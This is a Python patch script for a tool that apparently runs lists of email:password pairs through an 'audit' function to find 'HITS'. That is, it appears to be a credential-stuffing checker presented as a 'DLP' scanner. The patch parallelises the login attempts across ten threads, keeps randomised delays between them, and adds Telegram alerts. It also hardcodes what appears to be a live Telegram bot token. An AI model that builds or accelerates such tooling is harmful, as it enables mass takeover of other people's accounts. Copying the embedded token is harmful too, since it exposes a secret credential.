import os
import re

fp = "telethon_listener.py"
with open(fp, "r", encoding="utf-8") as f:
    code = f.read()

# 1. Add concurrent.futures import if missing
if "import concurrent.futures" not in code:
    code = code.replace("import asyncio", "import asyncio\nimport concurrent.futures")

# 2. Add the Startup Notification logic right after valid_creds extraction
notif_logic = """
    print(f"✅ Procesando {len(valid_creds)} objetivos en background...")
    
    # 🔥 AVISO INICIAL A TELEGRAM
    try:
        from server import get_db_conn, q
        conn = get_db_conn()
        cur = conn.cursor()
        if target_user_filter:
            cur.execute(q("SELECT telegram_chat_id FROM users WHERE username = ?"), (target_user_filter,))
        else:
            cur.execute(q("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''"))
        users = cur.fetchall()
        conn.close()
        
        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
        for row in users:
            cid = row[0]
            msg = f"📥 *NUEVO ARCHIVO DETECTADO*\\nSe encontró un archivo con `{len(valid_creds)}` correos en ASTERA.\\n\\n⚡ _Iniciando Escáner DLP Turbo...\\nTe notificaré los HITS cuando termine._"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Error alerting start: {e}")
"""

code = code.replace('    print(f"✅ Procesando {len(valid_creds)} objetivos en background...")', notif_logic)

# 3. Replace the slow for-loop with ThreadPoolExecutor
loop_logic = """    dummy_q = DummyQueue()
    
    for cred in valid_creds:
        email, pwd = cred.split(':', 1)
        try:
            # We pass multi_user=True, the hit_buffer and the user filter
            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer, target_user_filter=target_user_filter)
        except Exception as e:
            print(f"Error scanning {email}: {e}")
        
        # 'Tiempo al tiempo' - delay between credentials
        time.sleep(random.uniform(0.5, 1.2))"""

turbo_logic = """    dummy_q = DummyQueue()
    
    def scan_cred(cred):
        email, pwd = cred.split(':', 1)
        try:
            # We pass multi_user=True, the hit_buffer and the user filter
            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer, target_user_filter=target_user_filter)
        except Exception as e:
            print(f"Error scanning {email}: {e}")
        
        # 'Tiempo al tiempo' - slight delay between threads
        time.sleep(random.uniform(0.5, 1.2))

    # 🔥 TURBO MODE: 10 hilos en paralelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_cred, valid_creds)"""

if "executor.map(scan_cred, valid_creds)" not in code:
    code = code.replace(loop_logic, turbo_logic)

with open(fp, "w", encoding="utf-8") as f:
    f.write(code)

print("Turbo patch applied successfully.")
